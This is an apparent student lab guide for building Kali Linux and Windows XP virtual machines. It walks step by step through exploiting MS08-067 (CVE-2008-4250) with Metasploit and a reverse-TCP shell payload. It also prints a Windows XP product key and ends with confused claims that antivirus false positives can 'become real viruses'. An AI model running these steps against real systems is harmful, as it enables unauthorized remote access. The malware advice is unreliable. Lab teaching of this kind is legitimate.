# INSTALL DOCUMENT

## Get Started With Our Project!

1. Enable virtualization on your windows machine by searching “Turn windows feature on or off in windows search bar.

2. You will be prompted with many folders, check the options (virtual Machine Platform, Windows hypervisor Platform) press ok and it will prompt you to restart your machine, then restart.

3. If still needed, enable virtualization from bios by following this [video](https://youtu.be/LQIyowZMiY8?si=hLTgTE97Z5RX1dJS).

4. Now you can download VMware Workstation Pro for free by visiting this [site](https://access.broadcom.com/default/ui/v1/signin/).

5. Create an account with broadcom.

6. Go to software > VMware Cloud Foundation > MyDownloads > VMware Workstation Pro > VMware Workstation Pro 17.0 Windows > latest release. Or VMware Workstation Player.  If you have trouble downloading(which probably you will have) follow this youtube [video](https://youtu.be/agw2i6QddvE?si=mT8Ux7C42ign7Ioo).

7. Go on the Kali Linux [website](https://www.kali.org/get-kali/#kali-installer-images) and downloaded the recommended Kali ISO file installer.

8. Make sure when creating the virtual machines to have the machines files saved separatly not in one file to be able to modify them later.

9. Then follow this [YouTube tutorial](https://www.youtube.com/watch?v=U0AMu3rznc4)

10. Then go on [archive.org](https://archive.org/details/WinXPProSP1) website and download windows xp iso file.

11. Install and setup windows xp vmware workstation 17 while watching this [youtube video](https://www.youtube.com/watch?v=ghr5ef-pxXM) and make sure to enter this product key: DF32F-Q323T-JH3HT-QRG42-34YX8.

12. Setup vm machines settings by visiting this [git repository](https://github.com/Ibrahimelz/ASPS.git).

13. download it and follow the instructions in the ***scripts/VMware_files*** to isolate your machines correctly.

14. Then power on both kali linux and windows xp virtual machines.

15. Then open terminal on kali linux and write the following commands:
    - `ifconfig` or `ip address show` to know your own ip address.

    - `ping [target machine’s ip]` to check if the other machine is up(checks if the target machine is up and reachable).

    - `nmap -sV [target machine’s ip]` scans the version of service (operation system) of the targeted machine .

    - `nmap -p 1-65535 --script vuln [target machine’s ip] -Pn` scans the target machine by running the "vuln" category of scripts to check for common vulnerabilities on the machine(scans the target machine to find out the version of the operating system and services running on it).

    - have the vulnerability’s `IDs: CVE which is CVE-2008-4250` identify the vulnerability to work with by its Common Vulnerabilities and Exposures (CVE) ID, in this case, CVE-2008-4250.

    - `sudo msfconsole` the command to run metasploit.

    - `search CVE-xxxx-xxxx` search the vulnerability found by nmap. In this case `CVE-2008-4250`.

    - take the name of the exploit which is **exploit/windows/smb/ms08_067_netapi** the machine running is vulnerable to this exploit.

    - `use [exploit name]` to go on that exploit to set it up to use it (load the exploit by entering its name).

    - `show options` shows the exploit's information for necessary actions to set up the exploit.

    - `set RHOSTS [target machine’s ip]` set the target machine as the RHOST (remote host).

    - `set LHOST [attacker machine's ip]` this field will be filled with a default value such as **127.0.0.0** it is recommended to change that.

    - `set LPORT 4444` this field will also be filled but make sure that the port is **4444** as sometimes it will change to **8080**.

    - `show payloads` and choose the needed payload, in our case we tried using a shell payload named **windows/shell_reverse_tcp** the payload is the action to perform on the target machine, in this case it will take control of the shell by reverse tcp.

    - `exploit` or `run` Execute the exploit to perform the intended action on the target machine and voila, you have access to the victim’s command shell as a powerful use.

    - Then if you want to close everything you need to do `cntrl + c` to get out of the windows xp cmd, then `exit` to get out of the metasploit tool. Then you simply close the terminal, then you can shut down both virtual machines.

## ATTENTION
***FOR A FINAL SECURITY MEASURE, MOST TIMES WINDOWS DEFENDER WILL PICK KALI.iso IMAGE WITH THE SCRIPTS INSIDE IT AS VIRUSES. YOU WILL TYPICALLY HAVE 365 VIRUSES OR SO. TO MAKE SURE TO EVADE FURTHER COMPICATIONS, DELETE THE iso IMAGE AFTER FININSHING THE VIRTUAL MACHINE'S SET UP***
The cause for such a thing is that the scripts necessary for the kali tools inside the iso to function are flagged as viruses for security measures and such a thing cannot be disabled.
However, these "False-positive" viruses might burst out because you tried to fight them in a wrong way and ***THEY MIGHT BECOME REAL VIRUSES*** that could affect your computer and you could affect many other devices if interacted with.
So please be cautious and treat the situation carefully.

**If you ever forgot to delete the iso file** and one day the windows defender picked these "viruses" up, ***BE CAREFUL TO NOT MESS WITH THEM*** in any way, shape, or form.
Instead, try to delete the iso file itself, sometimes windows will not allow you to because the "viruses" are active and you cannot delete an active script just like that.
However, this could be treated easily by going into safe mode. Restart your machine by clicking restart in the windows menu and press `shift` while doing so.